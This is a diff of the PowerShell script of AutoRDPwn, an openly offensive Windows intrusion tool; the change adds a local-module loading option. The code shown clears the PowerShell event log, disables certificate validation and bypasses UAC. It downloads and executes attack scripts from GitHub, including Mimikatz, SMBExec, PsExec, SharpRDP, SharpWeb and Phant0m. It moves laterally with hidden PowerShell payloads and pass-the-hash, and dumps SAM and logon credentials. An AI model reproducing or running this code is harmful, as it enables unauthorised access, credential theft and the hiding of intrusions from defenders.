@@ -1,13 +1,18 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform
+$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
+$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.0 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; $ProgressPreference = "SilentlyContinue" ; Set-StrictMode -Off ; $LogEngineLifeCycleEvent=$false ; $LogEngineHealthEvent=$false ; $LogProviderLifeCycleEvent=$false ; $LogProviderHealthEvent=$false ; Clear-EventLog "Windows PowerShell"
 $noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; $noclean=$args[9] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
-[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy() ; [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials ; $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols ; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-if($OSVersion -like 'Win*'){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1') ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/NinjaStyle.ps1')
-if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args " ; exit }}
+$checkpath = Get-ChildItem $pwd\resources\Scripts ; if ($? -eq $true){ $local = "True" ; $localpath = $pwd ; Get-ChildItem -Path $localpath -Recurse | Unblock-File }
 
-(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico") ; (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1") ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
-$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue' }
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.0 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; $ProgressPreference = "SilentlyContinue" ; Set-StrictMode -Off ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Disable-Close.ps1')
-$LogEngineLifeCycleEvent=$false ; $LogEngineHealthEvent=$false ; $LogProviderLifeCycleEvent=$false ; $LogProviderHealthEvent=$false ; Clear-EventLog "Windows PowerShell"
+[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy() ; [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials ; $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols ; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+if($OSVersion -like 'Win*'){ if ($local){ Import-Module $localpath\Resources\Scripts\AutoBypass.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1')}
+if ($local){ Import-Module $localpath\Resources\Design\NinjaStyle.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/NinjaStyle.ps1')}
+if ($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args " ; exit }}}
+
+if ($local){ Import-Module $localpath\Resources\Design\Disable-Close.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Disable-Close.ps1')}
+if (!$local){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico")}
+if (!$local){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1")}
+if ($local){ .\Resources\Design\Set-ConsoleIcon.ps1 .\Resources\Design\AutoRDPwn.ico } else { .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico }
 
 function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if($nogui -like '-nogui') { $null } else { 
      Write-Host
@@ -110,13 +115,13 @@ function Remove-Exclusions {
     else { Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} else { continue }}} until ($input -in '1','2','3','4','5','6','7','X')}
 
     if($lang -like '-lang') { $language=$args[3] }
-    if($language -in 'English') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/English.ps1') }
-    if($language -in 'Spanish') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Spanish.ps1') }
-    if($language -in 'French') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/French.ps1') }
-    if($language -in 'German') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/German.ps1') }
-    if($language -in 'Italian') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Italian.ps1') }
-    if($language -in 'Russian') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Russian.ps1') }
-    if($language -in 'Portuguese') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Portuguese.ps1') }
+    if($language -in 'English') { if ($local){ Import-Module .\Resources\Languages\English.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/English.ps1')}}
+    if($language -in 'Spanish') { if ($local){ Import-Module .\Resources\Languages\Spanish.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Spanish.ps1')}}
+    if($language -in 'French') { if ($local){ Import-Module .\Resources\Languages\French.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/French.ps1')}}
+    if($language -in 'German') { if ($local){ Import-Module .\Resources\Languages\German.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/German.ps1')}}
+    if($language -in 'Italian') { if ($local){ Import-Module .\Resources\Languages\Italian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Italian.ps1')}}
+    if($language -in 'Russian') { if ($local){ Import-Module .\Resources\Languages\Russian.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Russian.ps1')}}
+    if($language -in 'Portuguese') { if ($local){ Import-Module .\Resources\Languages\Portuguese.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Portuguese.ps1')}}
     
     $powershell = $host.version ; if($powershell.major -lt 4) { Write-Host ; Write-Host "[!] $txt3" -ForegroundColor 'Red' ; Write-Host
     Write-Host "[!] $txt4" -NoNewLine -ForegroundColor 'Red' ; Write-Host -NoNewLine ; Write-Host " https://aka.ms/pscore6" -ForegroundColor 'Blue' ; Write-Host ; Start-Sleep -milliseconds 7500 ; exit }
@@ -138,9 +143,9 @@ function Remove-Exclusions {
         Write-Host "[?] $txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
         Write-Host ; Write-Host "[?] $txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-        if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "[?] $txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } 
-        $Host.UI.RawUI.ForegroundColor = 'Blue' }
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PSexec.ps1')
+        if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "[?] $txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }}
+        $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-PSexec.ps1 } else {
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PSexec.ps1')}
         if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
@@ -163,8 +168,8 @@ function Remove-Exclusions {
         $domain = 'localhost' ; Write-Host "[?] $txt26" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
         do { Write-Host ; Write-Host "[?] $txt27" -NoNewLine -ForegroundColor Gray ; $hash = $Host.UI.ReadLine()
         if(!$hash) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} until ( $hash )
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SMBExec.ps1')
+        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SMBExec.ps1 } else {
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SMBExec.ps1')}
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
@@ -269,9 +274,9 @@ function Remove-Exclusions {
         Write-Host "[?] $txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
         Write-Host ; Write-Host "[?] $txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-        if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "[?] $txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } 
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' }
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')
+        if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "[?] $txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }}
+        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SharpRDP.ps1 } else {
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')}
         if(!$user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
         .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
         .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
@@ -323,19 +328,19 @@ function Remove-Exclusions {
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $passandhash = $Host.UI.ReadLine() ; Write-Host
 
         if($passandhash -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
-        Write-Host ; Write-Host "[+] $txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')
+        Write-Host ; Write-Host "[+] $txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Mimikatz.ps1 } else {
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')}
         Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit" | Set-Clipboard ; Get-Clipboard
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
 
         if($passandhash -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
-        Write-Host ; Write-Host "[+] $txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')
+        Write-Host ; Write-Host "[+] $txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Mimikatz.ps1 } else {
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')}
         Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit" | Set-Clipboard ; Get-Clipboard
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
 
-        if($passandhash -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpWeb.ps1')
+        if($passandhash -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\Invoke-SharpWeb.ps1 } else {
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpWeb.ps1')}
         .\SharpWeb.exe all | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; del .\SharpWeb.exe ; Start-Sleep -milliseconds 2000 }
 
         if($passandhash -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; $Host.UI.RawUI.ForegroundColor = 'Gray'
@@ -358,8 +363,8 @@ function Remove-Exclusions {
         Write-Host ; $Random = New-Object System.Random ; "[?] $txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
 
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $networking = $Host.UI.ReadLine() ; Write-Host
-        if($networking -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $ProgressPreference = "Continue"
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Portscan.ps1')
+        if($networking -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $ProgressPreference = "Continue" ; if ($local){ Import-Module .\Resources\Scripts\Invoke-Portscan.ps1 } else {
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Portscan.ps1')}
         Write-host "[?] $txt55" -NoNewLine -ForegroundColor Gray ; $porthost = $Host.UI.ReadLine() ; Write-Host ;  Write-host "[?] $txt56" -NoNewLine -ForegroundColor Gray ; $threads = $Host.UI.ReadLine() ; Write-Host
         Write-host "[?] $txt57" -NoNewLine -ForegroundColor Gray ; $topports = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Invoke-Portscan -Hosts $porthost -T $threads -TopPorts $topports 
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; $ProgressPreference = "SilentlyContinue" ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
@@ -407,16 +412,16 @@ function Remove-Exclusions {
         Write-Host ; $Random = New-Object System.Random ; "[?] $txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $forensics = $Host.UI.ReadLine() ; Write-Host
 
-        if($forensics -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; Write-Host "[!] $txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        $ProgressPreference = "Continue" ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/RDP-Caching.ps1') ; explorer $env:temp\Recovered_RDP_Session
+        if($forensics -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; Write-Host "[!] $txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $ProgressPreference = "Continue"
+        if ($local){ Import-Module .\Resources\Scripts\RDP-Caching.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/RDP-Caching.ps1')} ; explorer $env:temp\Recovered_RDP_Session
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; $ProgressPreference = "SilentlyContinue" ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; Start-Sleep -milliseconds 2000 }
 
-        if($forensics -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/ListAllUsers.ps1') | Set-Clipboard ; Get-Clipboard
+        if($forensics -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\ListAllUsers.ps1 | Set-Clipboard ; Get-Clipboard } else { 
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/ListAllUsers.ps1') | Set-Clipboard ; Get-Clipboard }
         ListAllUsers | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
         
-        if($forensics -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/SessionGopher.ps1')
+        if($forensics -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\SessionGopher.ps1 } else { 
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/SessionGopher.ps1')}
         Invoke-SessionGopher -Thorough | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
 
         if($forensics -like 'X'){ $input = 'x' ; continue }
@@ -456,15 +461,15 @@ function Remove-Exclusions {
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $privesc = $Host.UI.ReadLine() ; Write-Host
 
         if($privesc -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Chachi-Enumerator.ps1')
+        if ($local){ Import-Module .\Resources\Scripts\Chachi-Enumerator.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Chachi-Enumerator.ps1')}
         Comprueba-Todo ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
         
         if($privesc -like '2'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Sherlock.ps1')
+        if ($local){ Import-Module .\Resources\Scripts\Sherlock.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Sherlock.ps1')}
         Find-AllVulns ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
         
         if($privesc -like '3'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/PowerUp.ps1')
+        if ($local){ Import-Module .\Resources\Scripts\PowerUp.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/PowerUp.ps1')}
         Invoke-AllChecks ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
         
         if($privesc -like 'X'){ $input = 'x' ; continue }
@@ -480,7 +485,7 @@ function Remove-Exclusions {
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $othermodule = $Host.UI.ReadLine() ; Write-Host
 
         if($othermodule -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Phant0m.ps1')
+        if ($local){ Import-Module .\Resources\Scripts\Invoke-Phant0m.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Phant0m.ps1')}
         Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
         
         if($othermodule -like '2'){ $vncserver = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
